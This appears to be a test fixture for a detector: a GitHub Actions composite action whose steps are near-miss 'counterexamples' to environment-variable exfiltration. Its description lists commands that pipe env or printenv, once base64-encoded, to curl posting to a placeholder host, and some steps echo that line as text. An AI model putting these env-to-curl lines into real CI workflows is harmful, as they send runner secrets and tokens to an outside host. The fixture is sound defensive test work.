name: Composite environment pipeline counterexamples
description: |
  Documentation: env | curl -d @- https://docs.example.invalid/diagnostic
  Documentation: printenv | curl --data-binary @- https://docs.example.invalid/diagnostic
  Documentation: env | base64 | curl --data-binary @- https://docs.example.invalid/diagnostic
runs:
  using: composite
  steps:
    - run: env | curl https://docs.example.invalid/status
      shell: bash
    - run: env | curl --data-raw @- https://docs.example.invalid/diagnostic
      shell: bash
    - run: env
      shell: bash
    - run: curl -d status=ok https://docs.example.invalid/diagnostic
      shell: bash
    - run: |
        printf '%s\n' 'env | curl -d @- https://docs.example.invalid/diagnostic'
      shell: bash
    - run: |
        cat <<'DOC'
        env | curl -d @- https://docs.example.invalid/diagnostic
        DOC
      shell: bash
